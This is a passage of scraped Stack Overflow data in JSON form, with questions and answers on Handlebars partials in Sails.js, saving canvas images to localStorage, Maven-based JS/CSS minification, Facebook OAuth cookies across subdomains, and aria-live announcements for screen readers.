                    "body": "<p>Edit:  This was fairly easy to implement via the express3-handlebars module while changing none of the default Sails functionality with the exception of asking you to move your layout file into <code>views/layouts</code>.  I've opened up a pull-request here (<a href=\"https://github.com/balderdashy/sails/pull/1075\" rel=\"nofollow\">https://github.com/balderdashy/sails/pull/1075</a>) if you would like to check it out.  </p>\n\n<hr>\n\n<p>After a bit of digging in the sails source-code, it's fairly easy to bring in partials when you render your view.  </p>\n\n<p>When you call <code>res.view</code> in your controller actions, just pass in a partials object as part of your \"locals\" which contains a list of partials you'd like rendered.  </p>\n\n<pre><code>  // LoginController.js\n  new: function (req, res) {\n    res.view({\n        partials: { \n          header: '../partials/header',\n          footer: '../partials/footer'\n        }\n    })\n  }\n\n  // new.handlebars\n  {{&gt; header}}\n      &lt;b&gt;Main content&lt;/b&gt;\n  {{&gt; footer}}\n</code></pre>\n\n<p>Helpers can be registered in a similar way, by attaching a key named <code>helpers</code> and passing in the functionality.</p>\n\n<p>It would be nice if there was a more formalized way to do this in the Sails core, but for now this should suffice for those who want to use handlebars instead of ejs while preserving some semblance of layouts.  </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I'm using the answers given above, but I seem to have made partials work with sails 0.9.8 with no hacks.</p>\n\n<p>Here's what I have.</p>\n\n<p>Config/views.js =>\nengine: \"handlebars\"</p>\n\n<p>views/home/index.handlebars => main file using the partial.</p>\n\n<p>views/home/partials/partial.handlebars => partial being used.</p>\n\n<p>Then as long as you use something like this, it works perfectly.\n    res.view({\n        partials: { \n          partial: 'partials/partial',\n          footer: 'partials/footer'\n        }\n    })</p>\n\n<p>The paths are relative to the template file called by default. So if you want different partials per controller you use partials/\nand if you want global partials for all templates you use ../partials/</p>\n\n<p>Obviously this is completely unto you as you need to specify every partial manually in the controller anyway.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>I'm running v0.10 beta but this shouldn't affect how I got it working below:</p>\n\n<ol>\n<li>Engine should be <strong>handlebars</strong> as expected</li>\n<li>Routes need to explicitly define controller and action. Setting view won't work. (Unless there's a way I couldn't figure out of setting the partials in the routes file)</li>\n<li>Controller needs partials defined as paths relative to the view.</li>\n</ol>\n\n<p><strong>config/views.js</strong></p>\n\n<pre><code>module.exports.views = {\n  engine      : 'handlebars',\n  layout      : false\n};\n</code></pre>\n\n<p><strong>config/routes.js</strong></p>\n\n<pre><code>'/': {\n  controller: 'site',\n  action: 'index'\n},\n</code></pre>\n\n<p><strong>SiteController.js</strong></p>\n\n<pre><code>module.exports = {\n  // Render Index View\n  index: function(req, res) {\n    res.view({\n      partials: {\n        head: 'partials/head',\n        tail: '../partials/tail',\n      },\n    });\n  }\n};\n</code></pre>\n\n<p><strong>views/site/index.handlebars</strong></p>\n\n<pre><code>{{&gt; head}}\n&lt;h3&gt;SITE INDEX&lt;/h3&gt;\n</code></pre>\n\n<p><strong>views/site/partials/head.handlebars</strong></p>\n\n<pre><code>&lt;h1&gt;HEAD&lt;/h1&gt;\n{{&gt; tail}}\n</code></pre>\n\n<p><strong>views/partials/tail.handlebars</strong></p>\n\n<pre><code>&lt;h2&gt;HEAD TAIL&lt;/h2&gt;\n</code></pre>\n\n<h1>OUTPUT</h1>\n\n<pre><code>&lt;h1&gt;HEAD&lt;/h1&gt;\n&lt;h2&gt;HEAD TAIL&lt;/h2&gt;\n&lt;h3&gt;SITE INDEX&lt;/h3&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>FYI,</p>\n\n<p>If you're using Sails 0.10 or above, I have published an NPM package to generate default handlebars views at <a href=\"https://www.npmjs.org/package/sails-generate-views-handlebars\" rel=\"nofollow\">https://www.npmjs.org/package/sails-generate-views-handlebars</a></p>\n\n<p>There is also a proposed PR for sails-generate-backend in order to properly support layouts and partials for handlebar when using \u2018sails generate \u2013template==handlebars\u2019 with no additional code and automatic discovery of partials based on a path (aka. views/partial/**)</p>\n\n<p>See: <a href=\"https://github.com/balderdashy/sails-generate-backend/pull/9\" rel=\"nofollow\">https://github.com/balderdashy/sails-generate-backend/pull/9</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I run <a href=\"https://github.com/balderdashy/sails/tree/717d85b96533c5705a061fd63bfd08061b3d89a6\">Sails <code>0.9.7</code></a> and have installed <a href=\"https://github.com/wycats/handlebars.js\">Handlebars</a> which is supported by <a href=\"https://github.com/visionmedia/consolidate.js\">Consolidate.js</a> and therefore is <a href=\"https://github.com/balderdashy/sails/blob/master/bin/boilerplates/config/views.js#L18\">supported by Sails</a></p>\n\n<p>I can serve pages from <code>.handlebars</code> files, it works just fine.\nI can't figure where, in Sails workflow, and in a <em>Sails way</em>, I should register partials, helpers etc... I'm more looking for best practices than just a <em>working solution</em> but any help will be appreciated. </p>\n",
            "last_activity_date": 1415641356,
            "question_id": 19810671,
            "score": 8,
            "tags": [
                "javascript",
                "handlebars.js",
                "handlebars",
                "sails.js"
            ],
            "title": "How to configure partials and layouts for Handlebars in Sails.js?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><strong>1)</strong> This is the only way you can convert an image into a string locally (with the excpetion of files loaded with <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\">FileReader</a>, see below). Optionally you need to use the server to do it.</p>\n\n<p><strong>2)</strong> To get a JPEG image you need to use the argument like this:</p>\n\n<pre><code>var datauri = imgCanvas.toDataURL(\"image/jpeg\", 0.5); //0.5 = optional quality\n</code></pre>\n\n<p>don't use <code>data:...</code> in the argument as that will be invalid and it will produce the default PNG as you can see in your result. <code>toDataURL()</code> can only take a type, ie. <code>image/png</code>, <code>image/jpeg</code> etc.</p>\n\n<p><strong>3)</strong></p>\n\n<h2>External files</h2>\n\n<p>If your image was loaded from a different origin (scheme, server ...) or by using local referenced files (<code>file://</code>, <code>/my/path/</code> etc.) CORS kicks in and will prevent you from creating a data-uri, that is: the image will be empty (and therefor invisible).</p>\n\n<p>For external servers you can request permission to use the image from a cross-origin by supplying the <code>crossOrigin</code> property:</p>\n\n<pre><code>&lt;img src=\"http://extrernalserver/....\" crossOrigin=\"anonymous\" /&gt;\n</code></pre>\n\n<p>or by code (<code>img.crossOrigin = 'anonymous';</code>) before setting the <code>src</code>.</p>\n\n<p>It's however up to the server to allow or deny the request.</p>\n\n<p>If it still doesn't work you will need to load your image through a proxy (f.ex. a page on your server that can load and the image externally and serve it from your own server).</p>\n\n<p>Or if you have access to the server's configuration you can add special access allow headers (<code>Access-Control-Allow-Origin: *</code>, see link below for more details).</p>\n\n<p>CORS (<a href=\"https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\">Cross-Origin Resource Sharing</a>) is a security mechanism and can't be worked around other than these ways.</p>\n\n<h2>Local files</h2>\n\n<p>For local files you will need to use <code>FileReader</code> - this can turn out to be an advantage as <code>FileReader</code> comes with a handy method: <code>readAsDataURL()</code>. This allow you to \"upload\" the image file directly as a data-uri without going by canvas.</p>\n\n<p>See examples here:<br>\n<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\">https://developer.mozilla.org/en-US/docs/Web/API/FileReader</a></p>\n\n<p>Unfortunately you can't just pick the files from code -  you will need to provide an input element or a drop zone so the user can pick the files (s)he want to store.</p>\n\n<h2>Conclusion</h2>\n\n<p>If all these steps are fulfilled to the degree that you actually do get an image the problem possibly is in the other end, the string being truncated being too long to store.</p>\n\n<p>You can verify by checking the length before and after storing the string to see if it has been cut:</p>\n\n<pre><code>console.log(imgAsDataURL.length);\n... set / get ...\nconsole.log(pic.length);\n</code></pre>\n\n<p>Other possibilities:</p>\n\n<ul>\n<li>The image element is not properly defined.</li>\n<li>A bug in the browser</li>\n<li>A bug in the framework</li>\n</ul>\n\n<p>(I think I covered most of the typical pitfalls?)</p>\n\n<p><strong>Update</strong> (missed one, sort of.. ;-p)</p>\n\n<p>OP found a specific in the framework which I'll include here for future reference:</p>\n\n<blockquote>\n  <p>In the end, the issue was with <code>$('#TestScreen_mobileimage_1').src =\n  policy_shot ;</code> I'm using Appery.io and they don't support <code>.src</code>.</p>\n  \n  <p>It's <code>$('#TestScreen_mobileimage_1').attr(\"src\", policy_shot ) ;</code></p>\n</blockquote>\n\n<p>A final note: <code>localStorage</code> is very limited in regards to storing images. Typical storage space is 2.5 - 5 mb. Each char stored takes 2 bytes and storing a data-uri encoded as base-64 is 33% larger than the original - so space will be scarce. Look into Indexed DB, Web SQL or File API for good alternatives.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>Here the complete solution using File Api</p>\n\n<pre>\n\n    &lt;html&gt;\n    &lt;body&gt;\n    &lt;input type=&quot;file&quot; id=&quot;image-input&quot; /&gt;\n    &lt;img id=&quot;image-container&quot; /&gt;\n    &lt;script type=&quot;text/javascript&quot;&gt;\n    (function(){\n          /** @type {Node} */\n      var imgInput = document.getElementById( &quot;image-input&quot; ),\n          /** @type {Node} */\n          imgContainer = document.getElementById( &quot;image-container&quot; ),\n          /** Restore image src from local storage */\n          updateUi = function() {\n            imgContainer.src = window.localStorage.getItem( &quot;image-base64&quot; );\n          },\n          /** Register event listeners */\n          bindUi = function(){\n            imgInput.addEventListener( &quot;change&quot;, function(){\n              if ( this.files.length ) {\n                var reader = new FileReader();\n                reader.onload = function( e ){\n                  window.localStorage.setItem( &quot;image-base64&quot;, e.target.result );\n                  updateUi();\n                };\n                reader.readAsDataURL( this.files[ 0 ] );\n              }\n            }, false );\n          };\n\n    updateUi();\n    bindUi();\n    }());\n    &lt;/script&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n\n</pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Thought I had this, but no. The goal: snap a photo (insurance card), save it locally, and retrieve it later.</p>\n\n<pre><code>// Get a reference to the image element\nvar elephant = document.getElementById(\"SnapIt_mobileimage_5\");\n\nvar imgCanvas = document.createElement(\"canvas\"),\nimgContext = imgCanvas.getContext(\"2d\");\n\n// Make sure canvas is as big as the picture\nimgCanvas.width = elephant.width;\nimgCanvas.height = elephant.height;\n\n// Draw image into canvas element\n\nimgContext.drawImage(elephant, 0, 0, elephant.width, elephant.height );\n console.log( 'Did that' );\n// Get canvas contents as a data URL\nvar imgAsDataURL = imgCanvas.toDataURL(\"data:image/jpg;base64,\");\n\n// Save image into localStorage\ntry {\nlocalStorage.setItem(\"elephant\", imgAsDataURL);\n}\ncatch (e) {\nconsole.log(\"Storage failed: \" + e);\n}; \n\n//Did it work?\nvar pic = localStorage.getItem(\"elephant\");\n\nconsole.log( elephant );\nconsole.log( pic );\n</code></pre>\n\n<p>Each step succeeds, the final output is:</p>\n\n<pre><code>&lt;img id=\"SnapIt_mobileimage_5\" class=\" SnapIt_mobileimage_5\" name=\"mobileimage_5\" dsid=\"mobileimage_5\" src=\"files/views/assets/image/IMG_0590.JPG\"&gt;\n data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA\n</code></pre>\n\n<p>On a new page, when I ask</p>\n\n<pre><code>var policy_shot = localStorage.getItem( 'elephant' );\nconsole.log( policy_shot );\n\n$('#TestScreen_mobileimage_1').src = policy_shot ;\n</code></pre>\n\n<p>It logs the binary:</p>\n\n<pre><code>data:image/png;base64,iVBORw0KGgoAAAANSUhEUg ....\n</code></pre>\n\n<p>But the image doesn't appear.</p>\n\n<ol>\n<li>Is there a simpler approach?</li>\n<li>Why is the getItem (binary) preceded by data:image/png; instead of data:image/jpg ?</li>\n<li>Is that why it doesn't display, or am I doing something else wrong?</li>\n</ol>\n",
            "last_activity_date": 1394105004,
            "question_id": 19017401,
            "score": 8,
            "tags": [
                "javascript",
                "jquery-mobile",
                "cordova",
                "html5-canvas"
            ],
            "title": "How to store and retrieve image to localStorage?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>A solution that has worked for me is using the <code>maven-minify-plugin</code> (groupId is <code>com.samaxes.maven</code>) but <em>only</em> when building for production. Use a build property to specify if you are in development mode or not. <a href=\"http://code.google.com/p/maven-samaxes-plugin/\">Link to plugin</a></p>\n\n<p>You can then have something like this (I don't know freemarker so I am just pasting some JSP code but I am sure it can easily be converted):</p>\n\n<pre><code>&lt;c:choose&gt;\n    &lt;c:when test=\"${developmentMode}\"&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;c:url value=\"/css/custom1.css\"/&gt;\"/&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;c:url value=\"/css/custom2.css\"/&gt;\"/&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;c:url value=\"/css/another1.css\"/&gt;\"/&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;c:url value=\"/css/another2.css\"/&gt;\"/&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/mylibrary.js\"/&gt;\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/more.js\"/&gt;\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/util.js\"/&gt;\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/whatever.js\"/&gt;\"&gt;&lt;/script&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/more.js\"/&gt;\"&gt;&lt;/script&gt;\n    &lt;/c:when&gt;\n    &lt;c:otherwise&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;c:url value=\"/css/minified.css\"/&gt;\"/&gt;\n        &lt;script type=\"text/javascript\" src=\"&lt;c:url value=\"/js/minified.js\"/&gt;\"&gt;&lt;/script&gt;\n    &lt;/c:otherwise&gt;\n&lt;/c:choose&gt; \n</code></pre>\n\n<p>This way non-minified/combined JS/css is used while in development and the minified css only used when building for production.</p>\n\n<p>EDIT: As requested here is the code to expose Spring-defined beans on the ServletContext:</p>\n\n<pre><code>&lt;bean class=\"org.springframework.web.context.support.ServletContextAttributeExporter\"&gt;\n    &lt;property name=\"attributes\"&gt;\n        &lt;map&gt;\n            &lt;!-- Obviously this can be changed to read from properties file --&gt;\n            &lt;entry key=\"developmentMode\" value=\"false\" /&gt; \n        &lt;/map&gt;\n    &lt;/property&gt;\n&lt;/bean&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p><a href=\"https://jawr.java.net/\" rel=\"nofollow\">Jawr</a> is a library that provides compression and merge of css/js files. It provides a Tag for the html include statements.\nThis make it possible to use the same unmodified JSP Page for development (with unmodified css/js) and production (merged and minified).</p>\n\n<p><a href=\"http://code.google.com/p/wro4j/\" rel=\"nofollow\">wro4j</a> seams to similar features.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Using <code>maven-minify-plugin</code>worked for me too.</p>\n\n<p>But I manage to find an even less intrusive way to use it than using conditional tags like <code>c:when</code>, by combining it with the <code>maven-war-plugin</code>.</p>\n\n<p>This code snippet can be used as it is :</p>\n\n<p>First, start by minifying the CSS/JS without using suffix (meaning that the files keep their name)</p>\n\n<pre><code>&lt;plugin&gt;\n    &lt;groupId&gt;com.samaxes.maven&lt;/groupId&gt;\n    &lt;artifactId&gt;minify-maven-plugin&lt;/artifactId&gt;\n    &lt;version&gt;1.7.2&lt;/version&gt;\n    &lt;executions&gt;\n        &lt;execution&gt;\n            &lt;id&gt;default-minify&lt;/id&gt;\n            &lt;phase&gt;prepare-package&lt;/phase&gt;\n            &lt;configuration&gt;\n               &lt;charset&gt;UTF-8&lt;/charset&gt;\n               &lt;skipMerge&gt;true&lt;/skipMerge&gt; &lt;!-- do not create one big file --&gt;\n               &lt;nosuffix&gt;true&lt;/nosuffix&gt; &lt;!-- do not use suffix like 'min' --&gt;\n\n               &lt;cssSourceDir&gt;css&lt;/cssSourceDir&gt;\n               &lt;cssSourceIncludes&gt;\n                   &lt;cssSourceInclude&gt;*.css&lt;/cssSourceInclude&gt;\n               &lt;/cssSourceIncludes&gt;\n\n               &lt;jsSourceDir&gt;js&lt;/jsSourceDir&gt;\n               &lt;jsSourceIncludes&gt;\n                   &lt;jsSourceInclude&gt;*.js&lt;/jsSourceInclude&gt;\n               &lt;/jsSourceIncludes&gt;\n\n           &lt;/configuration&gt;\n           &lt;goals&gt;\n               &lt;goal&gt;minify&lt;/goal&gt;\n           &lt;/goals&gt;\n       &lt;/execution&gt;\n   &lt;/executions&gt;\n</code></pre>\n\n<p></p>\n\n<p>Then, when building the war file, do not overide CSS/JS files (which are already generated in the target by the minify goal)</p>\n\n<pre><code>&lt;plugin&gt;\n    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n    &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;\n    &lt;version&gt;2.4&lt;/version&gt;\n    &lt;configuration&gt;\n        &lt;!-- in order to use minify filed listed bellow --&gt;\n        &lt;warSourceExcludes&gt;**/*.css, **/*.js&lt;/warSourceExcludes&gt;\n    &lt;/configuration&gt;\n&lt;/plugin&gt;\n</code></pre>\n\n<p>The built war will then contains the exact same files but compressed.\n(this might not be the best way to perform minifying, but it doesn't change anything in development)</p>\n\n<p>Hope this helps...</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'd like to add some kind of library, or maven plugin, or 'something' to combine and compress my javascript and css source files.</p>\n\n<p>However, I think this is pretty difficult to do unobtrusively with Java. The Rails people have pretty much solved this problem... it uses the unjoined/uncompressed files for development and then it compresses everything during production. It does this unobtrusively as you don't have to change your html headers or anything like that - it works for both testing and production. This is more or less what I want. Does it even exist in the Java space?</p>\n\n<p>The last thing I want is to comment and uncomment lines of freemarker/html code for development and production - I want everything to be the same. Ideally, I'd want to be able to leave Tomcat running and code my javascript and css, and see my changes instantly - no delays or hickups. I also don't want to have to manually run a command to generate the new javascript every time I make a change... or even have some daemon constantly update it (because then it might not be instantaneous when I'm testing). At the same time, if I'm going to package up my war for production, I want it to use the joined and compressed files instead.</p>\n\n<p>Is this even possible? If so, what tool should I be looking at? I know there are quite a few that do some of this, but they've fallen short on the \"unobtrusive\" aspect.</p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1399994640,
            "question_id": 8211965,
            "score": 8,
            "tags": [
                "java",
                "javascript",
                "css",
                "minify"
            ],
            "title": "Unobtrusive way to combine and compress javascript/css for java/spring/maven applications?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>If you set oauth to true when calling FB.init() via the Javascript API, you now get an fbsr_APP_ID cookie instead of a fbs_APP_ID cookie (notice the \"r\"). It contains a signed request and part of the oauth migration.</p>\n\n<p>If you use the PHP SDK, it should take care of the change. </p>\n\n<p>However, the docs for websites do not appear to be updated with a new get_facebook_cookie() function: <a href=\"https://developers.facebook.com/docs/guides/web/\">https://developers.facebook.com/docs/guides/web/</a></p>\n\n<p>It still uses the old cookie format. You can find how to parse a signed request here:</p>\n\n<p><a href=\"http://developers.facebook.com/docs/authentication/signed_request/\">http://developers.facebook.com/docs/authentication/signed_request/</a></p>\n\n<p>Then, you need to turn the \"code\" parameter in the cookie into an access_token via the docs here:\ndevelopers.facebook.com/docs/authentication/ (no http:// because of StackOverflow spam prevention)</p>\n\n<p>I dug around in the source of the new PHP SDK a little bit to figure this out since all of the documentation does not appear to be updated.</p>\n\n<p>The full code that I am using is a combination of the above with a little extra modifications to work with the old or new cookie format is below. The new get_facebook_cookie() function does return a few additional array elements (algorithm, code, issued_at, user_id) and a few array elements are no longer set (base_domain, secret, session_key, sig). The primary parameters most people are looking for are most likely set though (uid, access_token, and expires)</p>\n\n<pre><code>function get_facebook_cookie($app_id, $app_secret) {\n    if ($_COOKIE['fbsr_' . $app_id] != '') {\n        return get_new_facebook_cookie($app_id, $app_secret);\n    } else {\n        return get_old_facebook_cookie($app_id, $app_secret);\n    }\n}\n\nfunction get_old_facebook_cookie($app_id, $app_secret) {\n    $args = array();\n    parse_str(trim($_COOKIE['fbs_' . $app_id], '\\\\\"'), $args);\n    ksort($args);\n    $payload = '';\n    foreach ($args as $key =&gt; $value) {\n        if ($key != 'sig') {\n            $payload .= $key . '=' . $value;\n        }\n    }\n    if (md5($payload . $app_secret) != $args['sig']) {\n        return array();\n    }\n    return $args;   \n}\n\nfunction get_new_facebook_cookie($app_id, $app_secret) {\n    $signed_request = parse_signed_request($_COOKIE['fbsr_' . $app_id], $app_secret);\n    // $signed_request should now have most of the old elements\n    $signed_request[uid] = $signed_request[user_id]; // for compatibility \n    if (!is_null($signed_request)) {\n        // the cookie is valid/signed correctly\n        // lets change \"code\" into an \"access_token\"\n        $access_token_response = file_get_contents(\"https://graph.facebook.com/oauth/access_token?client_id=$app_id&amp;redirect_uri=&amp;client_secret=$app_secret&amp;code=$signed_request[code]\");\n        parse_str($access_token_response);\n        $signed_request[access_token] = $access_token;\n        $signed_request[expires] = time() + $expires;\n    }\n    return $signed_request;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>1) Check your App. domain in settings is set as mydomain.com and not www.mydomain.com<br>\n2) Use channel file and url in init:  </p>\n\n<pre><code>FB.init({  \nappId : [APP_ID],  \nstatus : false,  \ncookie : true,  \nxfbml : true,\nchannelUrl : document.location.protocol + \"//domain.com/xd_receiver.html\",  \noauth : true\n});  \n</code></pre>\n\n<p><a href=\"https://developers.facebook.com/docs/reference/javascript/FB.init/\" rel=\"nofollow\">https://developers.facebook.com/docs/reference/javascript/FB.init/</a>  </p>\n\n<p>hope this helps</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>check out this\n<a href=\"https://developers.facebook.com/apps/\" rel=\"nofollow\">https://developers.facebook.com/apps/</a><code>&lt;appid&gt;</code>/summary</p>\n\n<p>look at the App Domain:  part of \"Basic Info:\"<br>\nif you specify \"www.example.com\"  than it will only work for www.example.com.  If you use \"example.com\"  it will treat it as *.example.com  and work for all subdomains</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Update: The bug has been updated by Facebook to 'Fixed'. Hooray!</p>\n\n<p>This is a facebook bug and has been logged, reproduced and accepted as high priority here: <a href=\"https://developers.facebook.com/bugs/256155664428653?browse=search_4e843e6d89a232275456793\" rel=\"nofollow\">https://developers.facebook.com/bugs/256155664428653?browse=search_4e843e6d89a232275456793</a></p>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>EDIT: This bug was logged, and confirmed as a <a href=\"https://developers.facebook.com/bugs/256155664428653?browse=search_4e843e6d89a232275456793\" rel=\"nofollow\">Facebook bug</a>. It has now been fixed!</p>\n\n<hr>\n\n<hr>\n\n<p>I am testing my updates to move onto the new JS SDK. My app runs across multiple subdomains of my domain. On the old JDK, I was calling something like this:</p>\n\n<pre><code>FB.init({\n    appId: [APP_ID],\n    status: false,\n    cookie: true,\n    xfbml: true\n});\nFB.login();\n</code></pre>\n\n<p>On the new JDK, it looks like this:</p>\n\n<pre><code>FB.init({\n    appId: [APP_ID],\n    status: false,\n    cookie: true,\n    xfbml: true,\n    oauth:true\n});\nFB.login();\n</code></pre>\n\n<p>Using a cookie manager FF add on, you can see that the old version would set a cookie on mydomain.com, but the new one sets it to www.mydomain.com - meaning my other subdomain cannot access the cookie.</p>\n\n<p>To clarify: The problem is that I cannot use the facebook cookie on different subdomains, and also if I log them in on every subdomain, I have to log them out from every subdomain too</p>\n",
            "last_activity_date": 1386987251,
            "question_id": 7206204,
            "score": 8,
            "tags": [
                "javascript",
                "facebook",
                "cookies",
                "oauth"
            ],
            "title": "New JS SDK with OAuth 2.0 saving subdomain in fbsr_ cookie?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Here's an <a href=\"http://articles.sitepoint.com/article/ajax-screenreaders-work\" rel=\"nofollow\">SitePoint article</a> of several techniques (code therein) to try and let screenreaders notice dynamic content. It's conclusion </p>\n\n<blockquote>\n  <p>There doesn't appear to be any\n  reliable way to notify screen readers\n  of an update in the DOM.</p>\n</blockquote>\n\n<p>So it's mainly a quality of screenreader thing, newer screenreader generations might be better suited for dynamic content and the WAI ARIA initiative will probably be a hook specification for those screenreaders.</p>\n\n<p>Screenreaders and dynamic content are simply problematic and thus there are quite a few of articles out there to show you how to do it properly (avoidance).</p>\n\n<p>Read up on <a href=\"http://www.w3.org/WAI/intro/aria\" rel=\"nofollow\">WAI Aria</a>.<br>\nArticle on <a href=\"http://msdn.microsoft.com/en-us/scriptjunkie/ff743762.aspx\" rel=\"nofollow\">Script_Junkie</a>.<br>\n<a href=\"http://webaim.org/techniques/javascript/\" rel=\"nofollow\">Creating Accessible JavaScript</a>.  </p>\n\n<p>The sure fire way of making content accessible, is to make it work without JavaScript so users can opt to switch off JavaScript. This is also a good practise in conjunction with progressive enhancement. Thats the strategy we took on, first javascriptless, then augment it.</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>The <a href=\"http://www.w3.org/TR/wai-aria/\">WAI-ARIA</a> specification defines several ways by which screen readers can \"watch\" a DOM element. The best supported method is the <a href=\"http://www.w3.org/TR/wai-aria/states_and_properties#aria-live\"><code>aria-live</code></a> attribute. It has modes <code>off</code>, <code>polite</code>,<code>assertive</code> and <code>rude</code>. The higher the level of assertiveness, the more likely it is to interrupt what is currently being spoken by the screen reader.</p>\n\n<p>The following has been tested with <a href=\"http://www.nvda-project.org/wiki/Download\">NVDA</a> under Firefox 3 and Firefox 4.0b9:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;script src=\"js/jquery-1.4.2.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;button onclick=\"$('#statusbar').html(new Date().toString())\"&gt;Update&lt;/button&gt;\n  &lt;div id=\"statusbar\" aria-live=\"assertive\"&gt;&lt;/div&gt;\n&lt;/body&gt;\n</code></pre>\n\n<p>The same thing can be <a href=\"http://test.cita.illinois.edu/aria/alert/alert1.php\">accomplished</a> with WAI-ARIA <a href=\"http://www.w3.org/TR/wai-aria/roles\">roles</a> <code>role=\"status\"</code> and <code>role=\"alert\"</code>. I have had reports of incompatibility, but have not been able to reproduce them.</p>\n\n<pre><code>&lt;div id=\"statusbar\" role=\"status\"&gt;...&lt;/div&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>Here is an adapted real world example -- this up-level markup has already been converted from an unordered list with links into a select menu via JS. The real code is a lot more complex and obviously could not be included in its entirety, so remember this will have to be rethought for production use. For the select menu to be made keyboard accessible, we registered the keypress &amp; onchange events and fired the AJAX call when users tabbed off of the list (beware of browser differences in timing of the onchange event). This was a serious PITA to make accessible, but it IS possible.</p>\n\n<pre><code>  //  HTML\n\n  &lt;!-- select element with content URL --&gt;\n  &lt;label for=\"select_element\"&gt;State&lt;/label&gt;\n  &lt;select id=\"select_element\"&gt;\n     &lt;option value=\"#URL_TO_CONTENT_PAGE#\" rel=\"alabama\"&gt;Alabama&lt;/option&gt;\n  &lt;/select&gt;\n  &lt;p id=\"loading_element\"&gt;Content Loading&lt;/p&gt;\n\n  &lt;!-- AJAX content loads into this container --&gt;\n  &lt;div id=\"results_container\"&gt;&lt;/div&gt;\n\n\n  // JAVASCRIPT (abstracted from a Prototype class, DO NOT use as-is)\n\n  var selectMenu = $('select_element');\n  var loadingElement = $('loading_element');\n  var resultsContainer = $('results_container');\n\n // listen for keypress event (omitted other listeners and support test logic)\n  this.selectMenu.addEventListener('keypress', this.__keyPressDetector, false);\n\n\n /* event callbacks */\n\n // Keypress listener\n\n  __keyPressDetector:function(e){\n\n    // if we are arrowing through the select, enable the loading element\n    if(e.keyCode === 40 || e.keyCode === 38){\n        if(e.target.id === 'select_element'){\n            this.loadingElement.setAttribute('tabIndex','0');\n        }\n    }\n    // if we tab off of the select, send focus to the loading element\n    //  while it is fetching data\n     else if(e.keyCode === 9){\n        if(targ.id === 'select_element' &amp;&amp; targ.options[targ.selectedIndex].value !== ''){            \n            this.__changeStateDetector(e);\n\n            this.loadingElement.focus();\n\n        }   \n    }\n}\n\n// content changer (also used for clicks)\n__changeStateDetector:function(e){\n\n    // only execute if there is a state change\n    if(this.selectedState !== e.target.options[e.target.selectedIndex].rel){\n\n       // get state name and file path\n       var stateName = e.target.options[e.target.selectedIndex].rel;\n       var stateFile = e.target.options[e.target.selectedIndex].value;\n\n       // get the state file\n       this.getStateFile(stateFile);\n\n       this.selectedState = stateName;\n\n    }\n}\n\ngetStateFile:function(stateFile){\n    new Ajax.Request(stateFile, {\n        method: 'get',\n        onSuccess:function(transport){      \n\n            // insert markup into container\n            var markup = transport.responseText;\n\n            // NOTE: select which part of the fetched page you want to insert, \n            // this code was written to grab the whole page and sort later\n\n            this.resultsContainer.update(markup);\n\n            var timeout = setTimeout(function(){\n\n                // focus on new content\n               this.resultsContainer.focus();\n\n            }.bind(this), 150);\n\n        }.bind(this)\n    });\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>When a web page is loaded, screen readers (like the one that comes with OS X, or JAWS on Windows) will read the content of the whole page. But say your page is dynamic, and as users performing an action, new content gets added to the page. For the sake of simplicity, say you display a message somewhere in a <code>&lt;span&gt;</code>. How can you get the screen reader to read that new message?</p>\n",
            "last_activity_date": 1304630850,
            "question_id": 3670570,
            "score": 8,
            "tags": [
                "javascript",
                "accessibility",
                "screen-readers"
            ],
            "title": "Getting screen reader to read new content added with JavaScript"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<pre><code>$$('#example input[type=hidden]').first()\n</code></pre>\n",
